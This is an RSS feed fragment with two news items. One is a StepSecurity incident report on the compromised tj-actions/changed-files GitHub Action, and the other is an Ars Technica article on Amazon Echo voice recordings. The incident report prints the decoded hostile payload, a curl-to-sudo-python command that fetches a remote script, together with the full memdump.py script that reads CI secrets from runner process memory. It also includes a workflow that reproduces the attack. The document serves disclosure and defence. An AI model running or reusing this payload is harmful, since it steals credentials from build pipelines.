-<div id="readability-page-1" class="page"><div data-blog-post=""><h2>Introduction</h2><p>We are actively investigating a critical security incident involving the tj-actions/changed-files GitHub Action. While our investigation is ongoing, we want to alert users so they can take immediate corrective actions. We will keep this post updated as we learn more. <a href="https://github.com/step-security/harden-runner" target="_blank">StepSecurity Harden-Runner</a> detected this issue through anomaly detection when an unexpected endpoint appeared in the network traffic. Based on our analysis, the incident started around 9:00 AM March 14th, 2025 Pacific Time (PT) / 4:00 PM March 14th, 2025 UTC. If you need any help investigating this issue, please contact us at support@stepsecurity.io</p><p>Update 1: Most versions of tj-actions/changed-files are compromised.</p><p>Update 2:&nbsp;We have detected multiple public repositories have leaked secrets in build logs. As these build logs are public, anyone can steal these secrets. If you maintain any public repositories that use this Action, please review the recovery steps immediately.</p><p>Update 3: GitHub has removed the tj-actions/changed-files Action. GitHub Actions workflows can no longer use this Action.</p><h2>Summary of the incident</h2><p>‍<br>The tj-actions/changed-files GitHub Action, which is currently used in over 23,000 repositories, has been compromised. In this attack, the attackers modified the action’s code and retroactively updated multiple version tags to reference the malicious commit. The compromised Action prints CI/CD secrets in GitHub Actions build logs. If the workflow logs are publicly accessible (such as in public repositories), anyone could potentially read these logs and obtain exposed secrets.</p><p>Our Harden-Runner solution flagged this issue when an unexpected endpoint appeared in the workflow’s network traffic. This anomaly was caught by Harden-Runner’s behavior-monitoring capability.</p><p>The compromised Action now executes a malicious Python script that dumps CI/CD secrets from the Runner Worker process. Most of the existing Action release tags have been updated to refer to the malicious commit mentioned below. Note: All these tags now point to the same malicious commit hash:<code>0e58ed8671d6b60d0890c21b07f8835ace038e67</code>, indicating the retroactive compromise of multiple versions.”</p><pre contenteditable="false"><code><span>$ git tag -l | </span><span>while</span><span> read -r tag ; </span><span>do</span><span> git show --format=</span><span>"$tag: %H"</span><span> --no-patch $tag ; done | sort -k2
-</span><span>v1</span><span>.0</span><span>.0</span><span>: 0e58ed8671d6b60d0890c21b07f8835ace038e67
-</span>...
-<span>v35</span><span>.7</span><span>.7</span><span>-sec: 0e58ed8671d6b60d0890c21b07f8835ace038e67
-</span>...
-<span>v44</span><span>.5</span><span>.1</span><span>: 0e58ed8671d6b60d0890c21b07f8835ace038e67
-</span>...
-<span></span><span>v5</span><span>: 0e58ed8671d6b60d0890c21b07f8835ace038e67
-</span>...</code></pre><p><a href="https://github.com/salolivares">@salolivares</a> has identified the malicious commit that introduces the exploit code in the Action.</p><p><a href="https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67" target="_blank">https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67</a></p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4b101b7691ea36bd42479_Screenshot%202025-03-14%20at%203.42.44%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p>The base64 encoded string in the above screenshot contains the exploit code. Here is the base64 decoded version of the code.<br>‍</p><pre contenteditable="false"><code><span>if</span><span> [[ </span><span>"$OSTYPE"</span><span> == </span><span>"linux-gnu"</span><span> ]]; then
-</span><span>  B64_BLOB=</span><span>`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`</span><span>
-</span>  echo $B64_BLOB
-<span></span><span>else</span><span>
-</span><span>  exit </span><span>0</span><span>
-</span>fi
-</code></pre><p>‍</p><p>Here is the content of https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py</p><pre contenteditable="false"><code><span>#!</span><span>/usr/</span><span>bin/env python3
-</span>...
-
-def get_pid():
-<span>    # https:</span><span>//stackoverflow.com/questions/2703640/process-list-on-linux-via-python</span><span>
-</span><span>    pids = [pid </span><span>for</span><span> pid </span><span>in</span><span> os.listdir(</span><span>'/proc'</span><span>) </span><span>if</span><span> pid.isdigit()]
-</span>
-<span>    </span><span>for</span><span> pid </span><span>in</span><span> pids:
-</span><span>        </span><span>with</span><span> open(os.path.join(</span><span>'/proc'</span><span>, pid, </span><span>'cmdline'</span><span>), </span><span>'rb'</span><span>) </span><span>as</span><span> cmdline_f:
-</span><span>            </span><span>if</span><span> b</span><span>'Runner.Worker'</span><span> </span><span>in</span><span> cmdline_f.read():
-</span><span>                </span><span>return</span><span> pid
-</span>
-<span>    raise Exception(</span><span>'Can not get pid of Runner.Worker'</span><span>)
-</span>
-<span></span><span>if</span><span> __name__ == </span><span>"__main__"</span><span>:
-</span>    pid = get_pid()
-    print(pid)
-
-<span>    map_path = f</span><span>"/proc/{pid}/maps"</span><span>
-</span><span>    mem_path = f</span><span>"/proc/{pid}/mem"</span><span>
-</span>
-<span>    </span><span>with</span><span> open(map_path, </span><span>'r'</span><span>) </span><span>as</span><span> map_f, open(mem_path, </span><span>'rb'</span><span>, </span><span>0</span><span>) </span><span>as</span><span> mem_f:
-</span><span>        </span><span>for</span><span> line </span><span>in</span><span> map_f.readlines():  # </span><span>for</span><span> each mapped region
-</span><span>            m = re.match(r</span><span>'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])'</span><span>, line)
-</span><span>            </span><span>if</span><span> m.group(</span><span>3</span><span>) == </span><span>'r'</span><span>:  # readable region
-</span><span>                start = int(m.group(</span><span>1</span><span>), </span><span>16</span><span>)
-</span><span>                end = int(m.group(</span><span>2</span><span>), </span><span>16</span><span>)
-</span>                # hotfix: OverflowError: Python int too large to convert to C long
-<span>                # </span><span>18446744073699065856</span><span>
-</span><span>                </span><span>if</span><span> start &gt; sys.maxsize:
-</span><span>                    </span><span>continue</span><span>
-</span>                mem_f.seek(start)  # seek to region start
-            
-<span>                </span><span>try</span><span>:
-</span>                    chunk = mem_f.read(end - start)  # read region contents
-                    sys.stdout.buffer.write(chunk)
-                except OSError:
-<span>                    </span><span>continue</span></code></pre><p>‍</p><p>Even though GitHub shows renovate as the commit author, most likely the commit did not actually come up renovate bot. The commit is an un-verified commit, so likely the adversary provided renovate as the commit author to hide their tracks.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d516607d85f7dcd6427f6c_Screenshot%202025-03-14%20at%2010.47.33%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p><a href="https://github.com/step-security/harden-runner" target="_blank">StepSecurity Harden-Runner</a> secures CI/CD workflows by controlling network access and monitoring activities on GitHub-hosted and self-hosted runners. The name "Harden-Runner" comes from its purpose: strengthening the security of the runners used in GitHub Actions workflows. The Harden-Runner community tier is free for open-source projects. In addition, it offers several enterprise features.</p><p>‍</p><h2>Reproducing the Exploit</h2><p>When this Action is executed with Harden-Runner, you can see the malicious code in action. We reproduced the exploit in a test repository. When the compromised <code>tj-actions/changed-files</code> action runs, Harden-Runner’s insights clearly show it downloading and executing a malicious Python script that attempts to dump sensitive data from the GitHub Actions runner’s memory. You can see the behavior here: <a href="https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357" target="_blank"><br>https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357</a><br>‍<br>To reproduce this, you can run the following workflow:</p><pre contenteditable="false"><code><span>name: </span><span>"tj-action changed-files incident"</span><span>
-</span>
-<span></span><span>on</span><span>:
-</span>  pull_request:
-    branches:
-      - main
-
-<span></span><span>permissions</span><span>:
-</span>  pull-requests: read
-
-<span></span><span>jobs</span><span>:
-</span>  changed_files:
-    runs-on: ubuntu-latest
-<span>    </span><span>name</span><span>: Test changed-files
-</span><span>    </span><span>steps</span><span>:
-</span>      - name: Harden Runner
-<span>        </span><span>uses</span><span>: step-security/harden-runner@v2
-</span><span>        </span><span>with</span><span>:
-</span><span>          disable-sudo: </span><span>true</span><span>
-</span>          egress-policy: audit
-
-      - uses: actions/checkout@v4
-<span>        </span><span>with</span><span>:
-</span><span>          fetch-depth: </span><span>0</span><span>
-</span>
-<span>      # Example </span><span>1</span><span>
-</span>      - name: Get changed files
-<span>        </span><span>id</span><span>: changed-files
-</span><span>        </span><span>uses</span><span>: tj-actions/changed-files@v35
-</span>
-      - name: List all changed files
-<span>        </span><span>run</span><span>: |
-</span><span>          </span><span>for</span><span> file </span><span>in</span><span> ${{ steps.changed-files.outputs.all_changed_files }}; </span><span>do</span><span>
-</span><span>            echo </span><span>"$file was changed"</span><span>
-</span>          done</code></pre><p>When this workflow is executed, you can see the malicious behavior through Harden-Runner:</p><p><a href="https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357" target="_blank">https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357</a></p><p>‍</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4a976992a1fec9f2f5fdf_Screenshot%202025-03-14%20at%203.10.33%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4a9a39b13e0353099df3c_Screenshot%202025-03-14%20at%203.10.14%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p>When this workflow runs, you can observe the malicious behavior in the Harden-Runner insights page. The compromised Action downloads and executes a malicious Python script, which attempts to dump sensitive data from the Actions Runner process memory.</p><h2>Recovery Steps</h2><p>🚨 If you are using any version of the tj-actions/changed-files Action, we strongly recommend you stop using it immediately until the incident is resolved.</p><h3>Review Actions Inventory</h3><p>You should perform a code search across your repositories to discover all instances of the tj-actions/changed-files Action. For example, the following GitHub search URL shows all instances of this Action in the Actions GitHub organization:<br><a href="https://github.com/search?q=org%3Aactions%20tj-actions%2Fchanged-files%20Action&amp;type=code" target="_blank">https://github.com/search?q=org%3Aactions%20tj-actions%2Fchanged-files%20Action&amp;type=code</a><br>‍<br>Please note that this GitHub search does not always return accurate results. If you have dedicated source code search solutions such as SourceGraph, they could be more effective with finding all instances of this Action in use.</p><h3>Review GitHub Actions workflow run logs</h3><p>You should review logs for the recent executions of the Action and see if it has leaked secrets. Below is an example of how leaked secrets appear in build logs.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4cca074c5030ca60fd281_Screenshot%202025-03-14%20at%205.39.11%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p>‍</p><p>This step is especially important for public repositories since their logs are publicly accessible.</p><h3>For StepSecurity Enterprise Customers</h3><p>The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installing <a href="https://github.com/apps/stepsecurity-actions-security" target="_blank">the StepSecurity GitHub App</a> to complete the following recovery step.</p><h4>Review Actions Inventory</h4><p>You can use the Actions inventory feature to discover all GitHub Actions workflows that are using tj-actions/changed-files.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4b492687d43d10aaaf409_Screenshot%202025-03-14%20at%203.57.53%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p>‍<br>‍</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4bca8432050339dc719fd_Screenshot%202025-03-14%20at%204.32.37%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><h4>StepSecurity Maintained changed-files Action</h4><p>We offer <a href="https://docs.stepsecurity.io/actions/stepsecurity-actions">secure drop-in replacements</a> for risky third-party Actions as part of our enterprise tier. We are currently in the process of onboarding this Action as a StepSecurity Maintained Action. Once onboarded, our enterprise customers can use the StepSecurity Maintained version of <em>tj-actions/changed-files </em>instead of the compromised versions.</p><h4>Review Harden-Runner Findings</h4><p>You can see if your workflows have called "gist.githubusercontent.com" by visiting "All Destinations" in your StepSecurity dashboard. If this endpoint appears in the list, review the workflow runs that called this endpoint.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4c1ab432050339dcae2dd_Screenshot%202025-03-14%20at%204.54.05%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><h2>Next Steps</h2><p>We have reported this issue to GitHub and opened an issue in the affected repository:<br>🔗 <a href="https://github.com/tj-actions/changed-files/issues/2463" target="_blank">GitHub Issue #2463</a></p><p>The GitHub issue is no longer accessible as the repository has been deleted.</p><p>In addition, <a href="https://www.cve.org/CVERecord?id=CVE-2023-51664">an official CVE</a> has been published.</p><p>We will continue to monitor the situation and provide updates as more information becomes available.</p><p>For real-time security monitoring and proactive anomaly detection in GitHub Actions workflows, consider using <a href="https://github.com/step-security/harden-runner" target="_blank">Harden-Runner </a>to detect and mitigate such threats.</p></div></div>]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Everything you say to your Echo will be sent to Amazon starting on March 28 (214 pts)]]></title>
-            <link>https://arstechnica.com/gadgets/2025/03/everything-you-say-to-your-echo-will-be-sent-to-amazon-starting-on-march-28/</link>
-            <guid>43367536</guid>
-            <pubDate>Fri, 14 Mar 2025 21:33:28 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2025/03/everything-you-say-to-your-echo-will-be-sent-to-amazon-starting-on-march-28/">https://arstechnica.com/gadgets/2025/03/everything-you-say-to-your-echo-will-be-sent-to-amazon-starting-on-march-28/</a>, See on <a href="https://news.ycombinator.com/item?id=43367536">Hacker News</a></p>
-<div id="readability-page-1" class="page"><div>
-          
-          
-<p>If that's not enough to deter you from sharing voice recordings with Amazon, note that the company allowed <a href="https://arstechnica.com/tech-policy/2019/04/amazon-admits-that-employees-review-small-sample-of-alexa-audio/">employees to listen to Alexa voice recordings.</a> In 2019, Bloomberg reported that Amazon employees listened to as many as 1,000 audio samples during their nine-hour shifts. Amazon <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=201602230">says</a> it allows employees to listen to Alexa voice recordings to train its speech recognition and natural language understanding systems.</p>
-<p>Other reasons why people may be hesitant to trust Amazon with personal voice samples include the previous usage of Alexa voice recordings <a href="https://arstechnica.com/tech-policy/2018/11/amazon-must-give-up-echo-recordings-in-double-murder-case-judge-rules/">in criminal trials </a>and Amazon <a href="https://arstechnica.com/tech-policy/2023/06/ftc-amazon-ring-workers-illegally-spied-on-users-of-home-security-cameras/">paying a settlement</a> in 2023 in relation to allegations that it allowed "thousands of employees and contractors to watch video recordings of customers' private spaces" taken from Ring cameras, per the Federal Trade Commission.</p>
-<h2>Save recordings or lose functionality</h2>
-<p>Likely looking to get ahead of these concerns, Amazon said in its email today that by default, it will delete recordings of users’ Alexa requests after processing. However, anyone with their Echo device set to “Don’t save recordings” will see their already-purchased devices’ Voice ID feature bricked. Voice ID <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=GYCXKY2AB2QWZT2X">enables Alexa</a> to do things like share user-specified calendar events, reminders, music, and more. Previously, Amazon <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=201602230">has said</a> that "if you choose not to save any voice recordings, Voice ID may not work." As of March 28, broken Voice ID is a guarantee for people who don't let Amazon store their voice recordings.</p>
-<p>Amazon's email says:</p>
-<blockquote><p>Alexa voice requests are always encrypted in transit to Amazon’s secure cloud, which was designed with layers of security protections to keep customer information safe. Customers can continue to choose from a robust set of controls by visiting the Alexa Privacy dashboard online or navigating to More &gt; Alexa Privacy in the Alexa app.</p></blockquote>
-<p>Amazon is forcing Echo users to make a couple of tough decisions: Grant Amazon access to recordings of everything you say to Alexa or stop using an Echo; let Amazon save voice recordings and have employees listen to them or lose a feature set to become more advanced and central to the next generation of Alexa.</p>
-<p>However, Amazon is betting big that Alexa+ can dig the voice assistant out of a <a href="https://arstechnica.com/gadgets/2024/07/alexa-had-no-profit-timeline-cost-amazon-25-billion-in-4-years/">financial pit</a>. Amazon has publicly committed to keeping the free version of Alexa around, but Alexa+ is viewed as Amazon's last hope for keeping Alexa alive and making it profitable. Anything Amazon can do to get people to pay for Alexa takes precedence over other Alexa user demands, including, it seems, privacy.</p>
-
-
-          
-                  </div></div>]]></description>
         </item>
     </channel>
 </rss>
